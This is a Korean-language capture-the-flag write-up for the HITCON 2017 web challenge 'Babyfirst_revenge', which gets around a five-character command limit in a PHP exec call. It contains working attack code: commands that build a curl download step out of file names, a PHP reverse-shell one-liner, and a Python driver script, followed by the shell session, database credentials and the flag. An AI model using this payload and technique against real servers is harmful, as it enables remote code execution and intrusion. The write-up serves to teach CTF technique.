# [WEB] HITCON 2017 - Babyfirst_revenge

# Description

http://52.199.204.34/

# Analysis

문제 페이지에 접근하면 소스는 다음과같다.

```php+HTML
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);

```

소스는 매우 간단하다.

cmd파라미터로 **입력받은 값의 길이가 5 이하**여야 exec를 통해 실행해준다.

즉 exec를 통해 무언가를하여 쉘을 따던가 원하는 명령어를 실행하던가 해야하는 문제이다.

24시간동안 열심히 삽질을 한 문제이다.

다양한 방법으로 공격이 가능한 문제이다.

# Exploit

### Case 1. curl

curl 명령어를 통해 원하는 스크립트를 서버에 다운받고 이를 이용하여 reverse shell을 여는 방법이다.

우선 들어가는 쿼리를 한번 보자.

```bash
>ls\
ls>>_
>\ \
>-t\
>\>g
ls>>_
# '_' 파일을 생성하며, 내용으로는 'ls -t >g'가 들어간다.
>aa
>\>\
>L\
>UR\
>\ \
>rl\
>cu\
sh _
# '_' 파일을 쉘 스크립트로써 실행해주며 'ls -t >g'의 수행 결과가 'g'파일에 들어가게 된다.
# 들어가는 내용은 최종적으로 'curl URL>aa'가 된다.
sh g
# 'g'파일을 쉘 스크립트로써 실행하면 'curl' 명령어가 실행되 URL의 index페이지를 'aa'파일로 저장하게 된다.
sh aa
# 그 후 저장된 index을 쉘 스크립트로써 실행한다.
```

index페이지에 들어가는 내용은 다음과 같다.

```Bash
php -r '$sock=fsockopen("URL",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

그로인해 완성된 코드는 다음과 같다.

```python
import requests
import urllib
import time


cmds = ['>ls\\','ls>>_','>\\ \\','>-t\\','>\\>g','ls>>_','>aa','>\\>\\','>L\\','>UR\\','>\\ \\','>rl\\','>cu\\','sh _','sh g','sh aa']

r = requests.get('http://52.199.204.34/?reset=1')
for d in cmds:
    r = requests.get('http://52.199.204.34/?cmd='+urllib.quote(d))
    print d
    time.sleep(0.5)
```

nc로 포트를 열어놓고 위 코드를 실행하면 쉘이 떨어진다!

디렉토리를 탐색 해보자.

```
$ cd home
$ ls
fl4444g
orange
ubuntu
$ cd fl4444g
$ ls
README.txt
$ cat README.txt
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

DB안에 플래그가 있는 모양이다.

mysql 유저와 패스워드를 알려줬으니 접속해서 탐색좀해보면 fl4gdb안에 this_is_the_fl4g테이블이 존재하는것을 알 수 있다.

플래그를 얻으러 가자!

```
$ mysql -u fl4444g -p
Enter password: SugZXUtgeJ52_Bvr
use fl4gdb;
select * from this_is_the_fl4g;
ls;
ERROR 1064 (42000) at line 3: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ls' at line 1
secret
hitcon{idea_from_phith0n,thank_you:)}
$
```



**hitcon{idea_from_phith0n,thank_you:)}**





### Case 2. tar



***thanks to Joizel***



